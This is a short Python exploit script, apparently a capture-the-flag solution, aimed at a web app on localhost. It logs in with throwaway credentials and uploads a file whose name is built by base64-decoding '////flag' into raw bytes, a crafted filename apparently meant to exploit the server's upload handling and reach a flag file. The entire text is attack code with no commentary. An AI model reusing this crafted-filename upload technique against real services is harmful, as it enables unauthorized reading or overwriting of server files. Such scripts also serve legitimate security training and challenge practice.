#!/usr/bin/env python3

from pwn import *
import requests
from sys import argv, exit, stderr
import os

BASE_URL = "http://127.0.0.1:3000"
UPLOAD_URL = f"{BASE_URL}/upload"
LOGIN_URL = f"{BASE_URL}/login"
UPLOAD_FILE = "/tmp/upload"
USERNAME = "a"
PASSWORD = "a"

s = requests.Session()

def log_response(resp):
    log.info(f"resp.text: {resp.text}")
    log.info(f"resp.status_code: {resp.status_code}")

def upload(filename, content, verbose=False):
    with open(UPLOAD_FILE, 'wb') as f:
        f.write(content)
    with open(UPLOAD_FILE, 'rb') as f:
        files = {"file": f}
        data = {"filename": filename}
        resp = s.post(url=UPLOAD_URL, files=files, data=data)
        verbose and log.info(f"request.body: {resp.request.body}")
        verbose and log_response(resp)

def login(username, password, verbose=False):
    data = {
        "username": username,
        "password": password,
    }
    resp = s.post(url=LOGIN_URL, data=data)
    verbose and log_response(resp)

if __name__ == "__main__":
    login(USERNAME, PASSWORD)
    filename = b64d(b"////flag").decode('latin-1')
    log.info(f"filename: {filename}")
    upload(filename, b"SOME CONTENT", verbose=True)
